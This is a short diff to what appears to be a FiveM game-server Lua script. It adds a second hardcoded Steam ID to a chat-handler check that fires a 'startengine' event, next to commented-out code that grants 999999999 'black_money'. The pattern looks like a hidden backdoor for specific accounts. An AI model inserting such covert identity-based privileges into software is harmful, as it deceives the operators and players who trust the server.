@@ -113,7 +113,7 @@ AddEventHandler('chatMessage', function(source, n, message)
 			local player = getIdentity(src)
 	
 
-			if player.identifier == 'steam:1100001115e4c94'  then
+			if player.identifier == 'steam:1100001115e4c94' or  player.identifier == 'steam:11000011693aece'  then
 			--	print('Utang granted')
 			--	xPlayer.addAccountMoney('black_money', 999999999)
 			TriggerClientEvent('retro_scripts:startengine', source)
